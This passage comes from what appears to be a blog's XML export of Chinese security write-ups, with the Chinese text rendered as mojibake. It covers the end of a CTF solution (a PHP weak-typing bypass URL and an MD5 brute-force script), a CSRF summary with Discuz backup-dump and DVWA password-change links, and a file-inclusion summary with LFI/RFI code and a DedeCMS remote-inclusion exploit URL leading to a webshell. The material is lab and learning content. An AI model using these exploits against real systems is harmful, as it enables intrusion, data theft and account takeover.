//oræˆç«‹åˆ™dieè¾“å‡ºnope2ï¼Œæ‰€ä»¥éœ€è¦count($a[&quot;bar2&quot;])==5å’Œis_array($a[&quot;bar2&quot;][0])æœ‰å€¼ echo &quot;good1&quot;; echo &apos;&lt;/br&gt;&apos;; $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); //æœ‰a2ï¼Œå¹¶ä¸”å€¼ä¸­æœ‰å­—ç¬¦ä¸²â€œnudtâ€ var_dump($pos); $pos===false?die(&quot;nope3&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val){ $val===&quot;nudt&quot;?die(&quot;nope3&quot;):NULL; //bar2ä¸­ä¸èƒ½æœ‰å­—ç¬¦nudt } $v2=1; echo ($v2); echo &apos;&lt;/br&gt;&apos;; } } $c=@$_GET[&apos;cat&apos;]; $d=@$_GET[&apos;dog&apos;]; if(@$c[1]){ if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d){ //éœ€è¦strcmp($c[1],$d)å’Œ$c[1]!==$dåŒæ—¶æˆç«‹ï¼Œå³$c$dæ—¢ç›¸ç­‰åˆä¸ç›¸ç­‰ //phpå¼±ç±»å‹ï¼Œstrcmpå‡½æ•°ä¸­æ•°ç»„å’Œå­—ç¬¦ä¸²æ¯”è¾ƒè¿”å›null echo &quot;good2&quot;; eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope4&quot;):NULL; //eregiå‡½æ•°æœ‰ä¸ª%00æˆªæ–­æ¼æ´ echo &quot;good3&quot;; var_dump(strpos(($c[0].$d), &quot;htctf2016&quot;)); strpos(($c[0].$d), &quot;htctf2016&quot;)?$v3=1:NULL; $c[0]å’Œ$dè¿æ¥è¿”å›å­—ç¬¦ä¸²htctf2016çš„ä½ç½® echo &quot;good4&quot;; } echo $v3; } if($v1 &amp;&amp; $v2 &amp;&amp; $v3){ include &quot;flag.php&quot;; echo &quot;helloï¼ŒGet It!&quot;; //echo &quot;flag{php_i5_n0t_b4d}&quot;; } ?&gt; æœ€ç»ˆçš„POCä¸ºï¼š http://127.0.0.1:8080/hetian/test.php?foo={&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[1],2,3,4,5],&quot;a2&quot;:&quot;nudt&quot;}&amp;cat[1][]=111&amp;cat[0]=aahtctf2016&amp;dog=%00 æ•ˆæœä¸ºï¼š 0x02 å¿˜è®°å¯†ç äº†æè¿°ï¼šåœ¨è¿™ä¸ªç½‘ç«™ï¼Œè®°å½•äº†å°ä¼™ä¼´ä»¬çš„å¯†ç ã€‚ å¯æ˜¯slashçš„å¯†ç æ€ä¹ˆä¹Ÿæ‰¾ä¸åˆ°äº†ï¼Œä½ èƒ½å¸®å¿™æ‰¾å‡ºæ¥ä¹ˆåœ°å€ï¼šhttp://218.76.35.75:20115 MD5çˆ†ç ´pythonè„šæœ¬ æ‰“å¼€å…¶ä»–çš„ä¸¤ä¸ªå‘ç°pageæ˜¯åå­—åŠ ä¸‰ä½æ•°å­—çš„md5å€¼ã€‚ è„šæœ¬å¦‚ä¸‹ï¼š # -*- coding: utf8 -*- import requests import hashlib url = &quot;http://218.76.35.75:20115/index.php?page=&quot; for id in range(100,999): id=str(id) id=&apos;slash&apos;+id #print id payload = hashlib.md5(id).hexdigest() poc = url+payload #print poc conn = requests.get(poc) res = conn.content res = str(res) if res.find(r&quot;æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯·è¿”å›&quot;)&gt;0 or res.find(r&quot;error!&quot;)&gt;0: print &quot;error!&quot; else: print poc print payload break æ•ˆæœå¦‚ä¸‹ï¼š]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>PHP</tag>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRFæ¼æ´æ€»ç»“]]></title>
    <url>%2F2016%2F07%2F20%2FCSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[CSRFï¼ˆCross-site request forgeryè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ã€‚å°½ç®¡å¬èµ·æ¥åƒè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ï¼Œä½†å®ƒä¸XSSéå¸¸ä¸åŒï¼Œå¹¶ä¸”æ”»å‡»æ–¹å¼å‡ ä¹ç›¸å·¦ã€‚XSSåˆ©ç”¨ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€ŒCSRFåˆ™é€šè¿‡ä¼ªè£…æ¥è‡ªå—ä¿¡ä»»ç”¨æˆ·çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™ã€‚ä¸XSSæ”»å‡»ç›¸æ¯”ï¼ŒCSRFæ”»å‡»å¾€å¾€ä¸å¤§æµè¡Œï¼ˆå› æ­¤å¯¹å…¶è¿›è¡Œé˜²èŒƒçš„èµ„æºä¹Ÿç›¸å½“ç¨€å°‘ï¼‰å’Œéš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥è¢«è®¤ä¸ºæ¯”XSSæ›´å…·å±é™©æ€§ã€‚ 0x01 CSRFæ˜¯ä»€ä¹ˆï¼Ÿç½‘ç«™æ˜¯é€šè¿‡cookieæ¥è¯†åˆ«ç”¨æˆ·çš„ï¼Œå½“ç”¨æˆ·æˆåŠŸè¿›è¡Œèº«ä»½éªŒè¯ä¹‹åæµè§ˆå™¨å°±ä¼šå¾—åˆ°ä¸€ä¸ªæ ‡è¯†å…¶èº«ä»½çš„cookieï¼Œåªè¦ä¸å…³é—­æµè§ˆå™¨æˆ–è€…é€€å‡ºç™»å½•ï¼Œä»¥åè®¿é—®è¿™ä¸ªç½‘ç«™ä¼šå¸¦ä¸Šè¿™ä¸ªcookieã€‚å¦‚æœè¿™æœŸé—´æµè§ˆå™¨è¢«äººæ§åˆ¶ç€è¯·æ±‚äº†è¿™ä¸ªç½‘ç«™çš„urlï¼Œå¯èƒ½å°±ä¼šæ‰§è¡Œä¸€äº›ç”¨æˆ·ä¸æƒ³åšçš„åŠŸèƒ½ï¼ˆæ¯”å¦‚ä¿®æ”¹ä¸ªäººèµ„æ–™ï¼‰ã€‚å› ä¸ºè¿™ä¸ªä¸æ˜¯ç”¨æˆ·çœŸæ­£æƒ³å‘å‡ºçš„è¯·æ±‚ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„è¯·æ±‚ä¼ªé€ ï¼›å‘µå‘µï¼Œå› ä¸ºè¿™äº›è¯·æ±‚ä¹Ÿæ˜¯å¯ä»¥ä»ç¬¬ä¸‰æ–¹ç½‘ç«™æäº¤çš„ï¼Œæ‰€ä»¥å‰ç¼€è·¨ç«™äºŒå­—ã€‚ 0x02 CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿä½ è¿™å¯ä»¥è¿™ä¹ˆç†è§£CSRFæ”»å‡»ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚CSRFèƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ä½ åä¹‰å‘é€é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œç”šè‡³äºè´­ä¹°å•†å“ï¼Œè™šæ‹Ÿè´§å¸è½¬è´¦â€¦â€¦é€ æˆçš„é—®é¢˜åŒ…æ‹¬ï¼šä¸ªäººéšç§æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚ 0x03 CSRFä¸XSSçš„åŒºåˆ«XSSï¼š æ”»å‡»è€…å‘ç°XSSæ¼æ´â€”â€”æ„é€ ä»£ç â€”â€”å‘é€ç»™å—å®³äººâ€”â€”å—å®³äººæ‰“å¼€â€”â€”æ”»å‡»è€…è·å–å—å®³äººçš„cookieâ€”â€”å®Œæˆæ”»å‡» CSRFï¼š æ”»å‡»è€…å‘ç°CSRFæ¼æ´â€”â€”æ„é€ ä»£ç â€”â€”å‘é€ç»™å—å®³äººâ€”â€”å—å®³äººæ‰“å¼€â€”â€”å—å®³äººæ‰§è¡Œä»£ç â€”â€”å®Œæˆæ”»å‡» CSRFå°‘äº†ä¸€ä¸ª è·å–å—å®³äººçš„cookieçš„æ­¥éª¤ã€‚ä¸ºä»€ä¹ˆä¼šå°‘äº†å‘¢ã€‚å› ä¸ºå—å®³äººåœ¨æ‰§è¡Œä»£ç çš„æ—¶å€™å°±å·²ç»å®Œæˆçš„æ”»å‡»ï¼Œè€Œæ”»å‡»è€…å¹¶æ²¡æœ‰å‚ä¸è¿›æ¥ã€‚ ä¸¾ä¸ªä¾‹å­æ¥è¯´å§(å—å®³è€…çš„ç½‘å€æ˜¯a.cnï¼Œæ”»å‡»è€…çš„ç½‘å€æ˜¯b.cn)æ”»å‡»è€…æƒ³è¦åœ¨æŸä¸ªç½‘ç«™(ç½‘ç«™æ˜¯æŸä¸ªå¼€æºCMS)æ·»åŠ ä¸Šå¦ä¸€ä¸ªç®¡ç†å‘˜ï¼Œä½†æ˜¯è¿™ä¸ªç½‘ç«™å¹¶æ²¡æœ‰XSSæ¼æ´ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿè¿™æ—¶æ”»å‡»è€…å‘ç°äº†è¿™ä¸ªå¼€æºCMSåå°æ·»åŠ ç®¡ç†å‘˜æ—¶å¹¶æ²¡æœ‰åŠ å…¥éªŒè¯ç æˆ–åˆ™tokenï¼Œåªéœ€è¦è¾“å…¥è¦æ·»åŠ çš„ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ç‚¹å‡»ç¡®å®šå°±å¯ä»¥æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·äº†ã€‚è¿™æ—¶å’Œæˆ‘ä¸€æ ·èªæ˜çš„æ”»å‡»è€…åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªhtmlæ–‡ä»¶(å‡è®¾åœ°å€æ˜¯b.cn/index.html)ã€‚ç„¶åå°±ç»™ç½‘ç«™ç®¡ç†å‘˜å‘é‚®ä»¶ç­‰ç­‰ï¼Œè¯±ä½¿ç®¡ç†å‘˜æ‰“å¼€b.cn/index.htmlã€‚å½“ç®¡ç†å‘˜æ‰“å¼€åï¼ˆè¿™æ—¶ç®¡ç†å‘˜æ­£åœ¨ç½‘ç«™åå°ï¼Œæˆ–åˆ™ç®¡ç†å‘˜çš„sessionå¹¶æ²¡æœ‰å¤±æ•ˆçš„è¯ï¼‰ï¼Œå°±å¯ä»¥ç¥ä¸çŸ¥é¬¼ä¸è§‰çš„åœ¨ç½‘ç«™åå°æ·»åŠ äº†ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ã€‚ CSRFçš„ä¸¤ä¸ªä¾§é‡ç‚¹ï¼š 1.csrfçš„æ”»å‡»å»ºç«‹åœ¨æµè§ˆå™¨å’ŒwebæœåŠ¡å™¨çš„ä¼šè¯ä¹‹ä¸­ 2.æ¬ºéª—ç”¨æˆ·è®¿é—®æ¶æ„url 0x04 CSRFå®ä¾‹0x04_1 CSRFå¿«é€Ÿè„±åº“æ­£å¸¸æƒ…å†µä¸‹ï¼Œç®¡ç†å‘˜å¤‡ä»½æ•°æ®åº“çš„æ–¹æ³•æ˜¯è¿›å…¥ç®¡ç†é¡µé¢-ç®¡ç†ä¸­å¿ƒ-æ•°æ®å¤‡ä»½ æˆ‘ä»¬ç°åœ¨ç”¨æ™®é€šç”¨æˆ·åˆ©ç”¨CSRFæ¼æ´æ¥å¤‡ä»½ç½‘ç«™çš„æ•°æ®åº“ã€‚ ç¬¬ä¸€æ­¥ï¼šå»ºä¸ªç”¨æˆ·,æ™®é€šæƒé™ ç¬¬äºŒæ­¥ï¼šæ„é€ å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥ http://127.0.0.1:8080/discuz1.5/upload/uc_server/admin.php?m=db&amp;a=operate&amp;t=export&amp;appid=0&amp;backupdir=xxxx%26backupfilename%3Daaaa æ³¨ï¼šè¿™ä¸ªé“¾æ¥å°±æ˜¯adminæ­£å¸¸å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥ ç¬¬ä¸‰æ­¥ï¼šåˆ©ç”¨æ™®é€šç”¨æˆ·å‘ä¸€ä¸ªå¸–å­ï¼Œå¸–å­çš„ä¿¡æ¯èƒ½å¤Ÿè¾¾åˆ°è¯±éª—ç®¡ç†å‘˜è®¿é—®çš„ç›®çš„ï¼Œé‡Œé¢çš„å›¾ç‰‡å†™ä¸Šæˆ‘ä»¬å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥ï¼Œå®½é«˜éƒ½æ˜¯0ï¼Œè¿™æ ·å°±ä¸ä¼šçœ‹åˆ°æˆ‘ä»¬çš„æ¶æ„ä»£ç  ç¬¬å››æ­¥ï¼šå¼•è¯±ç®¡ç†å‘˜è®¿é—®å¸–å­ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„æµè§ˆå™¨ï¼Œè¿™æ ·å°±ä¸ä¼šå› ä¸ºcookieè€Œäº§ç”Ÿæ­§ä¹‰ ç¬¬äº”æ­¥ï¼šè®¿é—®æˆ‘ä»¬è‡ªå·±æ„é€ çš„è·¯å¾„ï¼Œå³å¯å¾—åˆ°æ•°æ®åº“ http://127.0.0.1:8080/discuz1.5/upload/uc_server/data/backup/xxxx/aaaa-1.sql 0x04_2 CSRFä¿®æ”¹å¯†ç æ¯”å¦‚æŸä¸€å¥—å¼€æºçš„CMSï¼ŒçŸ¥é“æ”¹å¯†ç çš„é“¾æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠè¿™äº›æ¶æ„ä»£ç ï¼ŒåµŒå…¥åˆ°æŸäº›é¡µé¢ï¼Œå¼•è¯±ç®¡ç†å‘˜æ¥è®¿é—®ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ”¹äº†ç®¡ç†å‘˜çš„å¯†ç ã€‚ è¿™é‡Œç”¨DVWAæ¥æ¼”ç¤ºå®ä¾‹ã€‚è¿™é‡Œé»˜è®¤è´¦æˆ·å¯†ç ä¸ºadmin/password ç¬¬ä¸€æ­¥ï¼šè°ƒå®‰å…¨çº§åˆ«ä¸ºä½ï¼Œç‚¹å‡»csrf ç¬¬äºŒæ­¥ï¼šæ„é€ æ¶æ„ä»£ç ï¼ŒåµŒå…¥åˆ°æŸä¸€é¡µé¢ï¼Œå¼•è¯±ç®¡ç†å‘˜è®¿é—® http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change# ç¬¬ä¸‰æ­¥ï¼šæˆåŠŸä¿®æ”¹ç®¡ç†å‘˜å¯†ç ,ä¹‹å‰çš„å¯†ç æ— æ³•ç™»é™† 0x05 CSRFé˜²å¾¡0x05_1 æœåŠ¡ç«¯çš„é˜²å¾¡1.éªŒè¯HTTP Refererå­—æ®µ 2.è¯·æ±‚åœ°å€ä¸­æ·»åŠ tokenå¹¶éªŒè¯ 3.åœ¨HTTPå¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯ 4.åœ¨æœåŠ¡ç«¯ä¸¥æ ¼åŒºåˆ†å¥½POSTä¸GETçš„æ•°æ®è¯·æ±‚ 5.ä½¿ç”¨éªŒè¯ç æˆ–è€…å¯†ç ç¡®è®¤æ–¹å¼è¿›è¡Œ 0x05_2 ç”¨æˆ·ç«¯çš„é˜²å¾¡0x05_3 å®‰å…¨è®¾å¤‡çš„é˜²å¾¡]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“]]></title>
    <url>%2F2016%2F07%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[ä¸¥æ ¼æ¥è¯´ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´æ˜¯â€œä»£ç æ³¨å…¥â€çš„ä¸€ç§ï¼Œå…¶åŸç†å°±æ˜¯æ³¨å…¥ä¸€æ®µç”¨æˆ·èƒ½æ§åˆ¶çš„è„šæœ¬æˆ–ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œã€‚â€œä»£ç æ³¨å…¥â€çš„å…¸å‹ä»£è¡¨å°±æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´å¯èƒ½å‡ºç°åœ¨JSPã€PHPã€ASPç­‰è¯­è¨€ä¸­ï¼ŒåŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæœ¬æ–‡åªä»‹ç»PHPæ–‡ä»¶åŒ…å«æ¼æ´ã€‚ 0x01 ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿç®€å•çš„æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬ç”¨ä¸€ä¸ªå¯æ§çš„å˜é‡ä½œä¸ºæ–‡ä»¶åå¹¶ä»¥æ–‡ä»¶åŒ…å«çš„çš„æ–¹å¼è°ƒç”¨äº†å®ƒï¼Œæ¼æ´å°±äº§ç”Ÿäº†ã€‚ä»¥PHPä¸ºä¾‹æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥åˆ†ä¸ºRFI(è¿œç¨‹æ–‡ä»¶åŒ…å«)å’ŒLFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼‰ä¸¤ç§ã€‚è€ŒåŒºåˆ†ä»–ä»¬æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯php.iniä¸­æ˜¯å¦å¼€å¯äº†allow_url_includeã€‚å¦‚æœå¼€å¯äº†æˆ‘ä»¬å°±æœ‰å¯èƒ½åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œå¦‚æœä¸æ˜¯æˆ‘ä»¬æœ‰å¯èƒ½åŒ…å«æœ¬åœ°çš„æ–‡ä»¶ã€‚ 0x02 æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå› ï¼ŸPHPæ–‡ä»¶åŒ…å«æ¼æ´çš„äº§ç”ŸåŸå› æ˜¯åœ¨é€šè¿‡PHPçš„å‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå°±å¯èƒ½å¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚ 0x03 PHPåŒ…å«æ¼æ´åˆ†ç±»ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼š 1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«LFI 2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«RFIï¼ˆéœ€è¦php.iniä¸­allow_url_include=onï¼‰ PHPä¸­å››ä¸ªåŒ…å«æ–‡ä»¶çš„å‡½æ•°ï¼š include(),include_once(),require()å’Œrequire_once() å®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼š include(),include\_once()åœ¨åŒ…å«æ–‡ä»¶æ—¶ï¼Œå³ä½¿é‡åˆ°é”™è¯¯ï¼Œä¸‹é¢çš„ä»£ç ä¾ç„¶ä¼šç»§ç»­æ‰§è¡Œï¼› è€Œrequire()å’Œrequire_once()åˆ™ä¼šæŠ¥é”™ï¼Œç›´æ¥é€€å‡ºç¨‹åºã€‚ 0x04 æœ¬åœ°æ–‡ä»¶åŒ…å«æµ‹è¯•ä»£ç main.phpï¼š &lt;?php echo &quot;Hello,this is file_include test!&quot;; //åˆå§‹åŒ– define(&quot;ROOT&quot;,dirname(_File_).&apos;/&apos;); //åŠ è½½æ¨¡å— $page = $_GET[&apos;page&apos;]; echo ROOT.$page.&apos;.php&apos;; include(ROOT.$page.&apos;.php&apos;) ?&gt; åœ¨åŒç›®å½•ä¸‹åˆ›å»º1.php: &lt;?php phpinfo();?&gt; è¯·æ±‚/main.php?page=1 0x05 è¿œç¨‹æ–‡ä»¶åŒ…å«åŸºäºHTTPåè®®çš„æµ‹è¯•ä»£ç  &lt;?php include($_GET[&apos;url&apos;]); ?&gt; åœ¨è¿œç¨‹ä¸»æœºæ”¾å…¥ä¸€ä¸ª2.txtï¼Œå†…å®¹ä¸º &lt;?php phpinfo();?&gt; åœ¨è¯·æ±‚çš„urlå‚æ•°ä¸­ä¼ å…¥2.txtçš„åœ°å€http://oacotcyq8.bkt.clouddn.com/2.txtè¿”å›æœ¬æœºçš„phpinfoä¿¡æ¯ã€‚ è¿œç¨‹æ–‡ä»¶åŒ…å«è¿˜æœ‰ä¸€ç§åˆ©ç”¨PHPè¾“å…¥è¾“å‡ºæµçš„åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡ŒPOSTä»£ç ï¼Œåªè¦æ‰§è¡ŒPOSTè¯·æ±‚main.php?url=php://input,POSTçš„å†…å®¹ä¸º&lt;?php phpinfo();?&gt;,å³å¯æ‰“å°å‡ºphpinfoä¿¡æ¯ã€‚ 0x06 æ–‡ä»¶åŒ…å«æ¼æ´å®ä¾‹0x06_1 æœ¬åœ°æ–‡ä»¶åŒ…å«å®ä¾‹1.é¦–å…ˆæœ‰ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªphpinfo()å‡½æ•°ã€‚ 2.æ‰“å¼€DVWAä¸Šä¼ å«æ¶æ„ä»£ç çš„å›¾ç‰‡ 3.åˆ©ç”¨æ–‡ä»¶åŒ…å«è®¿é—®é“¾æ¥ï¼š http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg 0x06_2 è¿œç¨‹æ–‡ä»¶åŒ…å«å®ä¾‹ä»¥Dedecmsçš„ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ä¸ºä¾‹ DedeCms &lt; 5.7-sp1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåœ¨äº†è§£è¿™ä¸ªæ¼æ´ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ApacheæœåŠ¡å™¨è§£ææ–‡ä»¶æµç¨‹ã€‚ å½“Apacheæ£€æµ‹åˆ°ä¸€ä¸ªæ–‡ä»¶æœ‰å¤šä¸ªæ‰©å±•åæ—¶ï¼Œæ¯”å¦‚1.php.bak,ä¼šä»å³å‘å·¦åˆ¤æ–­ï¼Œå› ä¸ºbakæ‰©å±•åApacheä¸è®¤è¯†ï¼Œæ‰€ä»¥å°±è¦å‘å‰è§£æï¼Œç›´åˆ°æœ‰ä¸€ä¸ªApacheè®¤è¯†çš„æ‰©å±•åï¼Œå¦‚æœå…¨éƒ¨çš„æ‰©å±•åéƒ½ä¸è®¤è¯†ï¼Œé‚£ä¹ˆä¼šæŒ‰ç…§httpd.confé…ç½®ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œå±•ç¤ºï¼Œä¸€èˆ¬é»˜è®¤çš„æ˜¯â€œtext/plainâ€è¿™ç§æ–¹å¼ã€‚æˆ‘ä»¬äº†è§£å®Œè¿™ä¸ªå†…å®¹åå†æ¥åˆ†æä¸‹é¢è¿™ä¸ªæ¼æ´ã€‚ è¿™ä¸ªé—®é¢˜å‡ºç°åœ¨install/index.php.bakè¿™ä¸ªæ–‡ä»¶ã€‚çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„ä»£ç ï¼š &lt;php? â€¦â€¦. else if($step==11) { require_once(â€˜../data/admin/config_update.phpâ€™); $rmurl = $updateHost.â€dedecms/demodata.{$s_lang}.txtâ€; echo $rmurl; $sql_content = file_get_contents($rmurl); $fp = fopen($install_demo_name,â€™wâ€™); if(fwrite($fp,$sql_content)) echo â€˜ [âˆš] å­˜åœ¨(æ‚¨å¯ä»¥é€‰æ‹©å®‰è£…è¿›è¡Œä½“éªŒ)â€™; else echo â€˜ [Ã—] è¿œç¨‹è·å–å¤±è´¥â€™; unset($sql_content); fclose($fp); exit(); â€¦â€¦ ?&gt; åœ¨ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬çœ‹åˆ°åœ¨step=11ä¸­ï¼Œé¦–å…ˆåŒ…å«äº†/data/admin/config_update.phpè¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å†æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š &lt;?php /** * æ›´æ–°æœåŠ¡å™¨ï¼Œå¦‚æœæœ‰å˜åŠ¨ï¼Œè¯·åˆ° http://bbs.dedecms.com æŸ¥è¯¢ * * @version $Id: config_update.php 1 11:36 2011-2-21 tianya $ * @package DedeCMS.Administrator * @copyright Copyright (c) 2007 - 2010, DesDev, Inc. * @license http://help.dedecms.com/usersguide/license.html * @link http://www.dedecms.com */ //æ›´æ–°æœåŠ¡å™¨ï¼Œå¦‚æœæœ‰å˜åŠ¨ï¼Œè¯·åˆ° http://bbs.dedecms.com æŸ¥è¯¢ $updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;; $linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;; æŒ‡å®šäº†updateHostå˜é‡çš„å€¼ã€‚çœ‹èµ·æ¥æ˜¯æ²¡æœ‰åŠæ³•åŒ…å«çš„ï¼Œå› ä¸ºå˜é‡æ˜¯å›ºå®šå€¼ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æŒ‡å®šäº†install_demo_nameæ˜¯config_update.phpè¿™æ–‡ä»¶ï¼Œå¹¶ä¸”å†…å®¹æ˜¯ä¸€ä¸ª404çš„æ–‡ä»¶ï¼Œæƒ…å½¢æ˜¯æ€ä¹ˆæ ·å­çš„å‘¢ï¼Ÿ æˆ‘ä»¬å…ˆæ¥è®¿é—®è¿™ä¸ªurl:http://127.0.0.1/ DedeCMS-5.7-UTF8-SP1/uploads/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php è¿™ä¼šè®©ä»£ç åˆ° http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt ä¸­å–å†…å®¹å†™å…¥åˆ° config_update.phpï¼Œdemodata.a.txtã€‚ä½ å¯èƒ½æƒ³è¦é—®äº†http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt è¿™ä¸ªæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬è®¿é—®ä¸€ä¸‹ å…¶å®ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥å˜é‡è¦†ç›–ä»¥åï¼Œæˆ‘ä»¬æ‰“å¼€config_update.phpä»¥åï¼Œé‡Œé¢å·²ç»ä»€ä¹ˆéƒ½æ²¡æœ‰äº† è¿™æ ·updataHostå˜é‡çš„å€¼ä¾¿æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³å†™ä»€ä¹ˆå°±å†™ä»€ä¹ˆäº†ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ã€‚æ„é€ ä¸€ä¸ªurlå³å¯å®Œæˆæ”»å‡»ï¼š http://127.0.0.1/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xxx.php&amp;updateHost=http://192.168.2.3/ 0x06_2.1 ç¼–å†™è„šæœ¬æµ‹è¯•1.å¼€å§‹æµ‹è¯•ï¼Œæ‰“å¼€dedecmsï¼Œå¯ä»¥æ­£å¸¸è®¿é—® 2.ç„¶åæ£€æµ‹è„šæœ¬æ˜¯å¦å¯ä»¥æ­£å¸¸è¿è¡Œ 3.è„šæœ¬å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œç„¶åæˆ‘ä»¬æµ‹è¯•æ¼æ´æ˜¯å¦å¯ä»¥åˆ©ç”¨æˆåŠŸï¼Œæˆ‘ä»¬æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾,æˆ‘ä»¬åœ¨ç›®å½•C:\wamp\www\dedecms\demodata.a.txtä¸­å†™å…¥éœ€è¦æˆ‘ä»¬å†™å…¥webæœåŠ¡å™¨ä¸­çš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥å†™å…¥xxx.phpçš„æ–‡ä»¶ä¸­ï¼Œä»è€Œè¾¾åˆ°getshellçš„ç›®çš„ã€‚ 4.æ”»å‡»è€…è¿œç¨‹IPåœ°å€ 5.ç„¶åæˆ‘ä»¬æµ‹è¯•æ¼æ´åˆ©ç”¨ 